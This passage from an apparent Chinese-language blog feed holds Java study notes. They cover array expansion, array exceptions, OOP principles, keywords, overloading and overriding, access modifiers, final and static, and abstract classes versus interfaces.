Arrays.copyOf() 进行扩容。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Array.copy(E[] e,newLength);<br></code></pre></div></td></tr></table></figure><p>其中第一个形参指的是需要扩容的数组，后面是扩容后的大小。其内部实现其实是使用了 System.arrayCopy(); 在内部重新创建一个长度为 newLength 类型是 E 的数组。<br>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] a= &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br>        a= Arrays.copyOf(a,a.length+<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length;i++) &#123;<br>            System.out.println(a[i]);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span> <span class="hljs-number">40</span> <span class="hljs-number">50</span> <span class="hljs-number">0</span> <span class="hljs-comment">//默认补充0</span><br></code></pre></div></td></tr></table></figure><h3 id="5-数组中的常见异常"><a href="#5-数组中的常见异常" class="headerlink" title="5.数组中的常见异常"></a>5.数组中的常见异常</h3><h4 id="5-1数组下标越界（ArrayIndexOutOfBoundsException）"><a href="#5-1数组下标越界（ArrayIndexOutOfBoundsException）" class="headerlink" title="5.1数组下标越界（ArrayIndexOutOfBoundsException）"></a>5.1数组下标越界（ArrayIndexOutOfBoundsException）</h4><p>错误代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;=arr.length;++i)&#123;<span class="hljs-comment">//数组的存值，下标是前闭后开的，即：存5个数，则下标是[0,5)的。是不包含5的。</span><br>System.out.println(arr[i]);<br>&#125;<br>System.out.println(arr[-<span class="hljs-number">2</span>]); <span class="hljs-comment">//下标越界。</span><br><span class="hljs-comment">//当出现异常之后，后面的代码是不能运行的。如：</span><br>System.out.println(arr[-<span class="hljs-number">2</span>]); <span class="hljs-comment">//下标越界。</span><br>System.out.println(<span class="hljs-string">&quot;hello world!&quot;</span>);<span class="hljs-comment">//不会输出</span><br></code></pre></div></td></tr></table></figure><h4 id="5-2空指针异常（NullPointerException）"><a href="#5-2空指针异常（NullPointerException）" class="headerlink" title="5.2空指针异常（NullPointerException）"></a>5.2空指针异常（NullPointerException）</h4><p>错误代码一：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>arr = <span class="hljs-keyword">null</span>;<span class="hljs-comment">//注释掉这句代码则可以正常运行。</span><br>System.out.println(arr[<span class="hljs-number">0</span>]);<span class="hljs-comment">//会出现异常。</span><br></code></pre></div></td></tr></table></figure><p>错误代码二：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[][] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">4</span>][];<br>System.out.println(arr[<span class="hljs-number">0</span>]);<span class="hljs-comment">//执行这句代码不会出错。会输出null</span><br>System.out.println(arr[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]);<span class="hljs-comment">//执行会出现空指针异常</span><br></code></pre></div></td></tr></table></figure><p>错误代码三：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String[] arr = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;AA&quot;</span>,<span class="hljs-string">&quot;BB&quot;</span>,<span class="hljs-string">&quot;CC&quot;</span>&#125;;<br>System.out.println(arr[<span class="hljs-number">0</span>].toString());<span class="hljs-comment">//输出 AA</span><br>arr[<span class="hljs-number">0</span>] = <span class="hljs-keyword">null</span>;<br>System.out.println(arr[<span class="hljs-number">0</span>].toString());<span class="hljs-comment">//会出现空指针异常</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(一)-正文</title>
    <link href="/2021/04/09/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%80)-%E6%AD%A3%E6%96%87/"/>
    <url>/2021/04/09/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%80)-%E6%AD%A3%E6%96%87/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识简单复习一。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-基本框架"><a href="#1-基本框架" class="headerlink" title="1.基本框架"></a>1.基本框架</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//创建文件 HelloWorld.java(文件名需与类名一致)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorld</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//注：String args[] 与 String[] args 都可以执行，但推荐使用 String[] args，这样可以避免歧义和误读。</span><br></code></pre></div></td></tr></table></figure><h4 id="1-1程序编译和运行"><a href="#1-1程序编译和运行" class="headerlink" title="1.1程序编译和运行"></a>1.1程序编译和运行</h4><p>在java环境文件夹目录下打开cmd(或者打开cmd后cd到java的环境文件夹中也行)。输入命令：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javac HelloWorld.java <span class="hljs-comment">//编译</span><br>java HelloWorld <span class="hljs-comment">//运行。需要注意的是java命令后面不需要加.class</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="2-java三大特性"><a href="#2-java三大特性" class="headerlink" title="2.java三大特性"></a>2.java三大特性</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">封装：封装把一个对象的属性私有化，同时提供一些可以被外界访问的属性的方法，如果属性不想被外界访问，我们大可不必提供方法给外界访问优点：减少耦合，代码重用，减轻维护<br>继承：它可以使用现有类的所有功能，并在无需重新编写原来的类的情况下对这些功能进行扩展。<br>多态：指允许不同类的对象对同一消息做出响应。<span class="hljs-comment">//只适用于方法，而不适用于属性。</span><br><span class="hljs-comment">//多态性</span><br><span class="hljs-comment">//针对方法：编译看左，运行看右。针对属性：编译和运行都看左。</span><br></code></pre></div></td></tr></table></figure><p>多态一般分为编译时多态和运行时多态，编译时主要指方法的重载；运行时主要指程序中定义的对象引用所指向的具体类型在运行期间才确定</p><p>运行时多态有三个条件：继承、覆盖和重写、向上转型（父类引用指向子类对象）</p><hr><h3 id="3-java六大原则"><a href="#3-java六大原则" class="headerlink" title="3.java六大原则"></a>3.java六大原则</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1.</span>开闭原则：对扩展开发放，对修改关闭，要求在添加新功能时不需要修改代码，符合开闭原则最典型的设计模式是装饰者模式<br><span class="hljs-number">2.</span>单一职责原则：一个类只负责一件事，尽量使用合成/聚合的方式，而不是使用继承。<br><span class="hljs-number">3.</span>里式替换原则 ：任何基类可以出现的地方，子类一定可以出现。<br><span class="hljs-number">4.</span>依赖倒转原则：依赖于抽象而不依赖于具体<br><span class="hljs-number">5.</span>接口隔离原则：使用多个隔离的接口，比使用单个接口要好 ，不应该强迫客户依赖于它们不用的方法。<br><span class="hljs-number">6.</span>迪米特法则：一个软件实体应当尽可能少地与其他实体发生相互作用。<br></code></pre></div></td></tr></table></figure><hr><h3 id="4-JAVA关键字"><a href="#4-JAVA关键字" class="headerlink" title="4.JAVA关键字"></a>4.JAVA关键字</h3><table><thead><tr><th align="left">类别</th><th align="left">关键字</th><th>说明</th></tr></thead><tbody><tr><td align="left">访问控制</td><td align="left">private</td><td>私有的</td></tr><tr><td align="left"></td><td align="left">protected</td><td>受保护的</td></tr><tr><td align="left"></td><td align="left">public</td><td>公共的</td></tr><tr><td align="left"></td><td align="left">default</td><td>默认</td></tr><tr><td align="left">类、方法和变量修饰符</td><td align="left">abstract</td><td>声明抽象</td></tr><tr><td align="left"></td><td align="left">class</td><td>类</td></tr><tr><td align="left"></td><td align="left">extends</td><td>扩充,继承</td></tr><tr><td align="left"></td><td align="left">final</td><td>最终值,不可改变的</td></tr><tr><td align="left"></td><td align="left">implements</td><td>实现（接口）</td></tr><tr><td align="left"></td><td align="left">interface</td><td>接口</td></tr><tr><td align="left"></td><td align="left">native</td><td>本地，原生方法（非 Java 实现）</td></tr><tr><td align="left"></td><td align="left">new</td><td>新,创建</td></tr><tr><td align="left"></td><td align="left">static</td><td>静态</td></tr><tr><td align="left"></td><td align="left">strictfp</td><td>严格,精准</td></tr><tr><td align="left"></td><td align="left">synchronized</td><td>线程,同步</td></tr><tr><td align="left"></td><td align="left">transient</td><td>短暂</td></tr><tr><td align="left"></td><td align="left">volatile</td><td>易失</td></tr><tr><td align="left">程序控制语句</td><td align="left">break</td><td>跳出循环</td></tr><tr><td align="left"></td><td align="left">case</td><td>定义一个值以供 switch 选择</td></tr><tr><td align="left"></td><td align="left">continue</td><td>继续</td></tr><tr><td align="left"></td><td align="left">default</td><td>默认</td></tr><tr><td align="left"></td><td align="left">do</td><td>运行</td></tr><tr><td align="left"></td><td align="left">else</td><td>否则</td></tr><tr><td align="left"></td><td align="left">for</td><td>循环</td></tr><tr><td align="left"></td><td align="left">if</td><td>如果</td></tr><tr><td align="left"></td><td align="left">instanceof</td><td>实例</td></tr><tr><td align="left"></td><td align="left">return</td><td>返回</td></tr><tr><td align="left"></td><td align="left">switch</td><td>根据值选择执行</td></tr><tr><td align="left"></td><td align="left">while</td><td>循环</td></tr><tr><td align="left">错误处理</td><td align="left">assert</td><td>断言表达式是否为真</td></tr><tr><td align="left"></td><td align="left">catch</td><td>捕捉异常</td></tr><tr><td align="left"></td><td align="left">finally</td><td>有没有异常都执行</td></tr><tr><td align="left"></td><td align="left">throw</td><td>抛出一个异常对象</td></tr><tr><td align="left"></td><td align="left">throws</td><td>声明一个异常可能被抛出</td></tr><tr><td align="left"></td><td align="left">try</td><td>捕获异常</td></tr><tr><td align="left">包相关</td><td align="left">import</td><td>引入</td></tr><tr><td align="left"></td><td align="left">package</td><td>包</td></tr><tr><td align="left">基本类型</td><td align="left">boolean</td><td>布尔型</td></tr><tr><td align="left"></td><td align="left">byte</td><td>字节型</td></tr><tr><td align="left"></td><td align="left">char</td><td>字符型</td></tr><tr><td align="left"></td><td align="left">double</td><td>双精度浮点</td></tr><tr><td align="left"></td><td align="left">float</td><td>单精度浮点</td></tr><tr><td align="left"></td><td align="left">int</td><td>整型</td></tr><tr><td align="left"></td><td align="left">long</td><td>长整型</td></tr><tr><td align="left"></td><td align="left">short</td><td>短整型</td></tr><tr><td align="left">变量引用</td><td align="left">super</td><td>父类,超类</td></tr><tr><td align="left"></td><td align="left">this</td><td>本类</td></tr><tr><td align="left"></td><td align="left">void</td><td>无返回值</td></tr><tr><td align="left">保留关键字</td><td align="left">goto</td><td>是关键字，但不能使用</td></tr><tr><td align="left"></td><td align="left">const</td><td>是关键字，但不能使用</td></tr><tr><td align="left"></td><td align="left">null</td><td>空</td></tr></tbody></table><hr><h3 id="5-java注释"><a href="#5-java注释" class="headerlink" title="5.java注释"></a>5.java注释</h3><p>支持单行以及多行注释。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 这是单行注释的示例</span><br><span class="hljs-comment">/* 这个也是单行注释的示例 */</span><br><span class="hljs-comment">/* 这是第一个Java程序</span><br><span class="hljs-comment">    * 它将输出 Hello World</span><br><span class="hljs-comment">    * 这是一个多行注释的示例</span><br><span class="hljs-comment">    */</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="6-方法重载和重写的区别"><a href="#6-方法重载和重写的区别" class="headerlink" title="6.方法重载和重写的区别"></a>6.方法重载和重写的区别</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">重写：发生在继承类中，方法名和参数列表相同，重写有以下三个限制：<br><span class="hljs-number">1.</span>子类方法的访问权限必须大于等于父类方法。<br><span class="hljs-number">2.</span>子类方法的返回类型必须是父类方法返回类型或为其子类型。如父类为<span class="hljs-keyword">void</span>，则子类也只能为<span class="hljs-keyword">void</span>。<br><span class="hljs-number">3.</span>子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。即子类抛出的异常类型不大于父类的异常类型。<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">重载：发生在同一个类中，方法名相同，参数列表不同（个数、类型、顺序），与权限修饰、返回值类型、抛出异常无关。<br></code></pre></div></td></tr></table></figure><p>注意：构造器是不可以被重写的，但是能重载。<br>构造方法的特性：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1.</span>名字与类名相同。<br><span class="hljs-number">2.</span>没有返回值，但不能用<span class="hljs-keyword">void</span>声明构造函数。<br><span class="hljs-number">3.</span>生成类的对象时自动执行，无需调用。<br></code></pre></div></td></tr></table></figure><hr><h3 id="7-常用修饰符特性"><a href="#7-常用修饰符特性" class="headerlink" title="7.常用修饰符特性"></a>7.常用修饰符特性</h3><p>Java中有4中访问权限的修饰符：private、default（(默认一般省略）、public、protected。一般用于对类或类中的成员（字段以及方法）加上访问修饰符。<br>权限的主要作用范围：同一个类中、同一个包下、父子类、不同的包<br>可被修饰对象：类和成员变量；类可见表示其它类可以用这个类创建实例对象；成员可见表示其它类可以用这个类的实例对象访问到该成员。<br>4种修饰符的权限范围：</p><blockquote><ul><li>private：指”私有的”。被其修饰的属性以及方法只能被该类的对象访问，其子类不能访问，更不能允许跨包访问</li><li>default：即不加任何访问修饰符，通常称为“默认访问权限“或者“包访问权限”。该模式下，只允许在同一个包中进行访问。</li><li>protected: 介于public 和 private 之间的一种访问修饰符，一般称之为“保护访问权限”。被其修饰的属性以及方法只能被类本身的方法及子类访问，即使子类在不同的包中也可以访问。</li><li>public： Java语言中访问限制最宽的修饰符，一般称之为“公共的”。被其修饰的类、属性以及方法不仅可以跨类访问，而且允许跨包访问。</li></ul></blockquote><table><thead><tr><th>修饰符</th><th>同类</th><th>同包</th><th>子类</th><th>不同包非子类</th></tr></thead><tbody><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>default</td><td>√</td><td>√</td><td>×</td><td>×</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>很容易看出，权限范围从小到大依次为：private &lt; default &lt; protected &lt; public</p><h4 id="final和static"><a href="#final和static" class="headerlink" title="final和static"></a>final和static</h4><p>final</p><hr><p>在Java中，final关键字可以用来修饰类、方法和变量（包括成员变量和局部变量）</p><ul><li>修饰变量：表示常量，对于基本类型，final 使数值不变；对于引用类型，final 使引用地址不变，但对象本身的属性是可以被修改的。</li><li>修饰方法：不能被子类的方法重写，但可以被继承，不能修饰构造方法。。</li><li>修饰类 ：该不能被继承，没有子类，final类中的方法默认是final的。Java中的String类就是一个final类</li></ul><p>static</p><hr><p>在Java语言中，static 可以用来修饰成员变量和成员方法，当然也可以是静态代码块</p><ul><li>静态变量：又称为类变量，该类的所有实例都共享本类的静态变量，且在内存中只存在一份</li><li>静态方法：在类加载的时候就存在了，它不依赖于任何实例，只能访问所属类的静态字段和静态方法，方法中不能有 this 和 super 关键字（此时可能没有实例）。</li><li>静态语句块：在类初始化时运行一次。</li><li>静态内部类：非静态内部类依赖于外部类的实例，而静态内部类不需要。静态内部类不能访问外部类的非静态的变量和方法。</li></ul><p>需要注意的是：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1.</span>静态变量，静态方法可以通过类名直接访问<br><span class="hljs-number">2.</span>初始化顺序：静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。（此处不演示，在类初始化篇章中演示）<br></code></pre></div></td></tr></table></figure><p>由于静态方法可以不通过对象进行调用，因此在静态方法里，不能调用其他非静态变量，也不可以访问非静态变量成员。</p><h4 id="成员变量、静态变量、局部变量的区别"><a href="#成员变量、静态变量、局部变量的区别" class="headerlink" title="成员变量、静态变量、局部变量的区别"></a>成员变量、静态变量、局部变量的区别</h4><p>从生命周期比较：</p><ul><li><p>静态变量可以被对象调用，也可以被类名调用。以static关键字申明的变量，其独立在对象之外，有许多对象共享的变量。在对象产生之前产生，存在于方法区静态区中。</p></li><li><p>成员变量只能被对象调用。随着对象创建而存在，随对象销毁而销毁。存在于堆栈内存中</p></li><li><p>局部变量在方法或语句块中申明的变量，生命周期只在定义的{}之中，不能跨方法或语句块使用。</p></li></ul><p>从访问权限比较：</p><ul><li><p>静态变量称为对象的共享数据，成员变量可以称为对象的特有数据，局部变量为方法所有</p></li><li><p>成员变量可以被 public,private,static 等修饰符所修饰，而局部变量不能被访问控制修饰符及 static 所修饰；但是，成员变量和局部变量都能被 final 所修饰。</p></li></ul><h4 id="abstract-和-interface"><a href="#abstract-和-interface" class="headerlink" title="abstract 和 interface"></a>abstract 和 interface</h4><h5 id="1-abstract"><a href="#1-abstract" class="headerlink" title="1.abstract"></a>1.abstract</h5><p>在 Java 中 abstract 即抽象，一般使用 abstract 关键字修饰的类或方法。<br>修饰的类时，一定有构造器（构造函数），便于子类实例化时调用。</p><blockquote><p>1.不能被实例化，需要继承抽象类后才能实例化其子类。<br>2.访问权限可以使用public、private、protected，其表达形式为：（public）abstract class 类名{}<br>3.抽象类不能使用final关键字修饰，因为final修饰的类是无法被继承<br>4.可以定义构造方法、静态方法、普通方法；非抽象的普通成员变量、静态成员变量</p></blockquote><p>修饰的方法时，只需要声明方法，不需要写方法体（大括号也不写）。</p><blockquote><p>1.含有该抽象方法的类必须定义为抽象类，但抽象类可以没有抽象方法。<br>2.访问权限可以使用public、default、protected，不能为private，因为抽象方法必须被子类实现（覆写），而private权限对于子类来 说是不能访问的，所以就会产生矛盾，<br>3.不能用static修饰，因为没有主体<br>4.若子类没有重写父类中的所有抽象方法，则此子类必须也是一个抽象类，用abstract修饰；否则必须全部重写父类中的抽象类方法。</p></blockquote><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span>  <span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">MyAbstract</span> </span>&#123;<br><span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;小米&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> price= <span class="hljs-number">1800</span>;<br><br>MyAbstract(String name)&#123;<br><span class="hljs-keyword">this</span>.name = name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(name);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(price);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//权限不能为 private //抽象方法</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>abstract使用注意点：</strong></p><blockquote><p>1.abstract 不能用来修饰 属性、构造器等结构。<br>2.abstract 不能用来修饰 私有方法、静态方法、final的方法、final的类。</p></blockquote><h5 id="2-interface"><a href="#2-interface" class="headerlink" title="2.interface"></a>2.interface</h5><p>在 Java中 interface 即接口，是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，Java 8 开始，接口也可以拥有default的方法实现，是因为不支持默认方法的接口的维护成本太高。</p><blockquote><p>1.接口的方法访问权限只能为 public ，Java 8可以为default，但是必须有方法体<br>2.接口的方法默认public abstract 也可以由 static 修饰<br>3.接口的方法可以定义为 public static ，但是必须有方法体，且只能有接口类名调用<br>4.成员变量默认为public staic final</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span>  <span class="hljs-title">MyInterface</span> </span>&#123;<br><span class="hljs-keyword">int</span> price = <span class="hljs-number">1800</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;MyInterface print： default Method&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">price</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;MyInterface price=&quot;</span>+price);<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyInterfaceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">MyInterface</span> </span>&#123;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span> </span>&#123;<br> System.out.println(<span class="hljs-string">&quot;I&#x27;m a MyInterfaceImpl&quot;</span>);<br>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>MyInterface my = <span class="hljs-keyword">new</span> MyInterfaceImpl();<br>my.outName();<br>my.print();<br><span class="hljs-comment">//MyInterfaceImpl.print();// 实现类类名调用时， 提示编译错误</span><br>MyInterface.price();<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="3-abstract-和-interface-的区别"><a href="#3-abstract-和-interface-的区别" class="headerlink" title="3.abstract 和 interface 的区别"></a>3.abstract 和 interface 的区别</h5><p>从定义分析</p><ul><li><p>抽象类和接口都不能直接实例化；抽象方法必须由子类来进行重写</p></li><li><p>抽象类单继承，接口多实现</p></li><li><p>抽象类可有构造方法，普通成员变量，非抽象的普通方法，静态方法</p></li><li><p>抽象类的抽象方法访问权限可以为：public、protected 、default</p></li><li><p>接口中变量类型默认public staic final，</p></li><li><p>接口中普通方法默认public abstract，没有具体实现</p></li><li><p>jdk1.8 中接口可有静态方法和default（有方法体）方法</p></li></ul><p>从应用场合分析</p><ul><li>接口：需要将一组类视为单一的类，而调用者只通过接口来与这组类发生联系。</li><li>抽象类：1、在既需要统一的接口，又需要实例变量或缺省的方法的情况下就可以使用它；2、定义了一组接口，但又不想强迫每个实现类都必须实现所有的接口</li></ul><h4 id="私有访问修饰符-private"><a href="#私有访问修饰符-private" class="headerlink" title="私有访问修饰符-private"></a>私有访问修饰符-private</h4><p>私有访问修饰符是最严格的访问级别，所以被声明为 private 的方法、变量和构造方法只能被所属类访问，并且类和接口不能声明为 private。</p><h4 id="受保护的修饰符-protected"><a href="#受保护的修饰符-protected" class="headerlink" title="受保护的修饰符-protected"></a>受保护的修饰符-protected</h4><ul><li>子类与基类在同一包中：被声明为 protected 的变量、方法和构造器能被同一个包中的任何其他类访问；</li><li>子类与基类不在同一包中：那么在子类中，子类实例可以访问其从基类继承而来的 protected 方法，而不能访问基类实例的protected方法。<br>protected 可以修饰数据成员，构造方法，方法成员，不能修饰类（内部类除外）。接口及接口的成员变量和成员方法不能声明为 protected。<br>如果我们只想让该方法对其所在类的子类可见，则将该方法声明为 protected。<h4 id="访问控制和继承"><a href="#访问控制和继承" class="headerlink" title="访问控制和继承"></a>访问控制和继承</h4>注意以下方法继承的规则：<blockquote><ul><li>父类中声明为 public 的方法在子类中也必须为 public。</li><li>父类中声明为 protected 的方法在子类中要么声明为 protected，要么声明为 public，不能声明为 private。</li><li>父类中声明为 private 的方法，不能够被继承。</li></ul></blockquote></li></ul><h4 id="非访问修饰符"><a href="#非访问修饰符" class="headerlink" title="非访问修饰符"></a>非访问修饰符</h4><p>1.static 